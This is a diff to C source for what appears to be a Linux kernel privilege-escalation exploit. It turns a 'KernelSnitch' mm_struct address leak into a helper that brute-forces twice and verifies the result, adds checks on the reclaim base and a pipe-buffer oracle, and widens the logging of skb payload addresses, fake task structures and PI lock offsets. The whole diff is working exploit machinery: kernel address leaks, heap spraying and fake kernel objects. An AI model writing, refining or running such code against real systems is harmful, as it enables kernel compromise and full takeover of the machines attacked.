@@ -82,6 +82,51 @@ void select_skb_data_delta(void) {
 #endif
 }
 
+int is_plausible_reclaim_base(uintptr_t base) {
+  if (base == 0) {
+    return 0;
+  }
+  if ((base & (ORDER3_SIZE - 1)) != 0) {
+    return 0;
+  }
+  if (!is_direct_ptr(base) || !is_direct_ptr(base + ORDER3_SIZE - 1)) {
+    return 0;
+  }
+  return 1;
+}
+
+uintptr_t kernelsnitch_stable_mm_leak(void) {
+  if (!ks) {
+    return (uintptr_t)-1;
+  }
+  kernelsnitch_bruteforce(ks);
+  uintptr_t leaked = ks->mm_struct;
+  if (leaked == (uintptr_t)-1) {
+    return (uintptr_t)-1;
+  }
+  /*
+   * Parallel first-wins bruteforce can accept a jhash false positive in an
+   * unmapped direct-map hole (RWC=40/42). Require a second independent scan.
+   */
+  ks->found = 0;
+  ks->mm_struct = (size_t)-1;
+  ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+  kernelsnitch_bruteforce(ks);
+  uintptr_t verify = ks->mm_struct;
+  if (verify == (uintptr_t)-1 || verify != leaked) {
+    pr_warning("KernelSnitch unstable leak=%016zx verify=%016zx\n", leaked,
+               verify);
+    return (uintptr_t)-1;
+  }
+  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  if ((leaked - base) % MM_STRUCT_SZ != 0 || !is_plausible_reclaim_base(base)) {
+    pr_warning("KernelSnitch implausible leaked=%016zx base=%016zx\n", leaked,
+               base);
+    return (uintptr_t)-1;
+  }
+  return leaked;
+}
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(SLIDE_P0_OFFSET_CANDIDATES)
 /*
  * If skb linear data starts at `base` but pointers used a wrong delta, the
@@ -701,12 +746,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     }
     pr_info("slide skb payload base=%016zx payload_base=%016zx delta=%lld "
             "gate_magic@0x%x reclaim_magic@0x40 primary_task=%016zx "
-            "primary_lock=%016zx primary_pi_lock=%016zx\n",
+            "primary_lock=%016zx primary_pi_lock=%016zx "
+            "oracle_parent=%016zx oracle_target=%016zx pipebuf=%016zx\n",
             base, payload_base, (long long)g_skb_data_delta,
             (unsigned)P0_ORACLE_GATE_PAGE_OFF,
             payload_base + SLIDE_BANK_TASK_OFF,
             payload_base + SLIDE_BANK_LOCK_OFF,
-            payload_base + SLIDE_BANK_TASK_OFF + FAKE_TASK_PI_LOCK_OFF);
+            payload_base + SLIDE_BANK_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
+            slide_bank_parents[0], slide_bank_targets[0], pipebuf_page_base);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
 #else
@@ -903,8 +950,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  kernelsnitch_bruteforce(ks);
-  uintptr_t leaked = ks->mm_struct;
+  uintptr_t leaked = kernelsnitch_stable_mm_leak();
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     kernelsnitch_cleanup(ks);
@@ -916,34 +962,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  /*
-   * Parallel first-wins bruteforce can accept a jhash false positive in an
-   * unmapped direct-map hole. A second independent scan must agree before we
-   * build PI waiters that spin_lock the derived address (panic on miss).
-   */
-  ks->found = 0;
-  ks->mm_struct = (size_t)-1;
-  ks->state = KERNELSNITCH_COLLISIONS_FOUND;
-  kernelsnitch_bruteforce(ks);
-  uintptr_t leaked_verify = ks->mm_struct;
-  if (leaked_verify == (uintptr_t)-1 || leaked_verify != leaked) {
-    pr_warning("KernelSnitch mm_struct unstable leak=%016zx verify=%016zx\n",
-               leaked, leaked_verify);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if ((leaked - base) % MM_STRUCT_SZ != 0 ||
-      !is_direct_ptr(base) ||
-      !is_direct_ptr(base + ORDER3_SIZE - 1)) {
-    pr_warning("KernelSnitch mm_struct implausible leaked=%016zx base=%016zx\n",
-               leaked, base);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!is_plausible_reclaim_base(pipebuf_page_base)) {
+    pr_warning("mm page ready but pipe oracle base unusable base=%016zx\n",
+               pipebuf_page_base);
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -952,13 +975,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     cleanup_page_prepare_state();
     return 0;
   }
-
+#endif
   select_skb_data_delta();
   uintptr_t payload_base = base + (uintptr_t)g_skb_data_delta;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu "
-          "payload_base=%016zx skb_delta=%lld\n",
+          "payload_base=%016zx skb_delta=%lld pipebuf=%016zx "
+          "page_struct=%016zx\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ, payload_base,
-          (long long)g_skb_data_delta);
+          (long long)g_skb_data_delta, pipebuf_page_base,
+          direct_to_page(base));
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
